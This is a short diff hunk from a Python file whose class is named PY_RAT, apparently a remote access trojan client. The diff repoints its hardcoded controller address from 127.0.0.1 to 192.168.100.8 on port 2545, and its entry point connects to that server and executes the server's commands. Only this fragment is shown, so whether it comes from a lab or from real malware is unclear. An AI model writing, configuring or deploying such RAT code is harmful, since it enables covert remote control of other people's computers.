@@ -611,7 +611,7 @@ class PY_RAT:
             quit()
 
 # Entry point of the script
-ratclient = PY_RAT('127.0.0.1', 2545)
+ratclient = PY_RAT('192.168.100.8', 2545)
 if __name__ == "__main__":
     ratclient.connect_to_server()
     ratclient.handle_server_commands()
